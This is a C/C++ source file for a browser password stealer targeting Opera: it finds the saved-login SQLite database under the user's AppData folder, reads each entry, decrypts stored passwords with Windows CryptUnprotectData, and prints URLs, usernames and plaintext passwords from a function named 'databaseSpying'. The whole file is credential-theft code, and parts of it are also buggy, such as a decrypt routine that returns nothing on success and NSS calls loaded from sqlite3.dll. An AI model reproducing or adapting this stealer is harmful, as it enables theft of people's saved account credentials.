
#include"password.h"
#include"help.h"


void initOperaBrowser()
{
	_dbFilePath = O_DBFILE;
	_regKeyPath = O_REGKEY;
	_folder = CSIDL_APPDATA;
	_ready = true;
	
}


BOOL loadFunctions(char* installPath)
{
	
	HMODULE hNSS = LoadLibraryA("sqlite3.dll");
		if (hNSS)
		{
			fpNSS_INIT = (NSS_Init)GetProcAddress(hNSS, "NSS_Init");
			fpNSS_Shutdown = (NSS_Shutdown)GetProcAddress(hNSS, "NSS_Shutdown");
			PK11GetInternalKeySlot = (PK11_GetInternalKeySlot)GetProcAddress(hNSS, "PK11_GetInternalKeySlot");
			PK11FreeSlot = (PK11_FreeSlot)GetProcAddress(hNSS, "PK11_FreeSlot");
			PK11Authenticate = (PK11_Authenticate)GetProcAddress(hNSS, "PK11_Authenticate");
			PK11SDRDecrypt = (PK11SDR_Decrypt)GetProcAddress(hNSS, "PK11SDR_Decrypt");
			isqlite3_open = (fpSqliteOpen)GetProcAddress(hNSS, "sqlite3_open");
			isqlite3_prepare_v2 = (fpSqlitePrepare_v2)GetProcAddress(hNSS, "sqlite3_prepare_v2");
			isqlite3_step = (fpSqliteStep)GetProcAddress(hNSS, "sqlite3_step");
			isqlite3_column_text = (fpSqliteColumnText)GetProcAddress(hNSS, "sqlite3_column_text");
			isqlite3_column_text_int = (fpSqliteColumnTextint)GetProcAddress(hNSS, "sqlite3_column_text");
			isqlite3_finalize = (fpSqliteFinalize)GetProcAddress(hNSS, "sqlite3_finalize");
			isqlite3_close = (fpSqliteClose)GetProcAddress(hNSS, "sqlite3_close");
			isqlite3_column_bytes = (fpSqliteColumnByte)GetProcAddress(hNSS, "sqlite3_column_byte");
			isqlite3_column_blob = (fpSqliteColumnBlob)GetProcAddress(hNSS, "sqlite3_column_blob");
			PLBase64Decode = (PL_Base64DecodeFunc)GetProcAddress(hNSS, "PL_Base64Decode");
			SECITEMZfreeItem = (SECITEM_ZfreeItemFunc)GetProcAddress(hNSS, "SECITEM_ZfreeItem");

			return !(!fpNSS_INIT || !fpNSS_Shutdown || !PK11GetInternalKeySlot || !PK11Authenticate || !PK11SDRDecrypt || !PK11FreeSlot || !PLBase64Decode || !SECITEMZfreeItem);

		}
		else
		{
			return FALSE;
		}
		
}



bool findAppdataPath(std::string& appdataPath)
{
	char path[MAX_PATH] = { 0 }; // MAX_PATH == 260 characters

	if (SHGetFolderPathA(NULL, _folder, NULL, 0, path) != S_OK)
	{
		
		return (false);
	}
	
	appdataPath.append(path); // add path in our string
	return (true);
}


void findPasswordTable(sqlite3* db)
{
	int i = 0;
	sqlite3_stmt* stmt;

	
	if (isqlite3_prepare_v2(db, QUERY, -1, &stmt, 0) == SQLITE_OK)
	{
		
		while (isqlite3_step(stmt) == SQLITE_ROW)
		{
			printPassword(stmt); /* decrypt and display infos */
			i++;
		}
		
	}
	
	isqlite3_finalize(stmt); // finalize the compiled query
	isqlite3_close(db); // close database
}


const char* uncryptData(BYTE* password)
{
	DATA_BLOB in;
	DATA_BLOB out;

	byte trick[1024];
	memcpy(trick, password, 1024);
	int size = sizeof(trick) / sizeof(trick[0]);

	in.pbData = password;
	in.cbData = size + 1;//we can't use strlen on a byte pointer,becouse of the NBs,so we have to be tricky dicky:)
	/*char* str = new char[size + 1];
	ZeroMemory(str, size + 1);*/

	if (CryptUnprotectData(&in, NULL, 0, 0,0,0, &out) == FALSE)
	{
		/*for (DWORD i = 0; i < out.cbData; i++)
			str[i] = out.pbData[i];
		str[out.cbData] = '\0';

		return str;*/
		printf("CryptUnprotectData failed with error 0x%.8x", GetLastError());
		return 0;
	}
	
		memcpy(password, out.pbData,out.cbData);
		password[out.cbData] = 0;
		printf("Successfully Decrypted Password is %s ", password);
}




void printPassword(sqlite3_stmt* stmt)
{
	std::string infos;
	std::string url = (const char*)isqlite3_column_text(stmt, 0);
	std::string login = (const char*)isqlite3_column_text(stmt, 1);
	BYTE* pass= (BYTE*)isqlite3_column_blob(stmt, 2); //This is the only encrypted field
	/*int bSize = isqlite3_column_bytes(stmt, 2);*/
	std::string password = uncryptData(pass);

	/*int bSize = isqlite3_column_bytes(stmt, 2);
	std::string password = uncryptData((BYTE*)isqlite3_column_blob(stmt,3));*/

	if (login != "" && password != "")
	{
		/*infos = (url + ':' + login + ':' + password);
		printf("%s \n",infos);*/
		printf( "Url: %s\n", url);
		printf( "Username: %s\n", login);
		printf( "Password: %s\n", password);

	}	
}

void databaseSpying()
{
	sqlite3* db;
	std::string dbPath;

	if (!_ready)
		printf("Browser path are not initialized");
	else

		if (findAppdataPath(dbPath)) // where is it's appdata folder
		{
			dbPath += _dbFilePath; // appdata folder path + database file path
			char* installPath =(char*)dbPath.c_str();
			loadFunctions(installPath);
			if (isqlite3_open(dbPath.c_str(), &db) == SQLITE_OK)
			{
				findPasswordTable(db);
			}
			else
			{
				printf("Error opening database");
			}
		}

}


int main(int ac, const char** av)
{
	
	printf("\n[Start new analyse]");

	// Opera
	initOperaBrowser();
	printf("\n\\ Launch Opera analyse /\n");
 	databaseSpying();
	printf("\n[Analyse terminated]\n");
	return (0);
}
